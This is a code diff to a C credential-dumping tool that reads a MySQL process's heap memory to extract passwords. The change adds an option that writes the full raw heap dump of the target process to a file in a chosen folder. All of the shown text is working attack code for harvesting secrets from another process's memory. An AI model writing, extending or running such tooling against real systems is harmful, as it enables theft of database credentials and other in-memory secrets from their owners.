@@ -4,17 +4,26 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/uio.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
 
 #include "dump-password.h"
 #include "globals.h"
 #include "heap.h"
 
 ssize_t (*memreadfunc)(pid_t, void *, size_t, off_t) = ignotum_mem_read;
+char *output_folder;
 
 void dump_mysql_password(pid_t pid, off_t *offset){
     ignotum_mapinfo_t heap;
+    char *output_file;
+
     size_t len, aux;
     ssize_t n;
+
+    int fd;
 
     printf("[*] getting heap address of pid %d\n", pid);
     if(getheapmap(pid, &heap)){
@@ -36,6 +45,25 @@ void dump_mysql_password(pid_t pid, off_t *offset){
     if(n <= 0){
         free(dump);
         return;
+    }
+
+    if(output_folder){
+        len = strlen(output_folder)+64;
+        output_file = malloc(len);
+        snprintf(output_file, len, "%s/%d-%lx-%lx.dump", output_folder,
+            pid, heap.start_addr, heap.end_addr);
+
+        fd = open(output_file, O_CREAT|O_TRUNC|O_RDWR, 0644);
+        if(fd == -1){
+            printf("[-] failed open %s\n", output_file);
+        } else {
+            write(fd, dump, n);
+            close(fd);
+
+            printf("[+] heap saved to %s\n", output_file);
+        }
+
+        free(output_file);
     }
 
     while((aux = *offset++)){
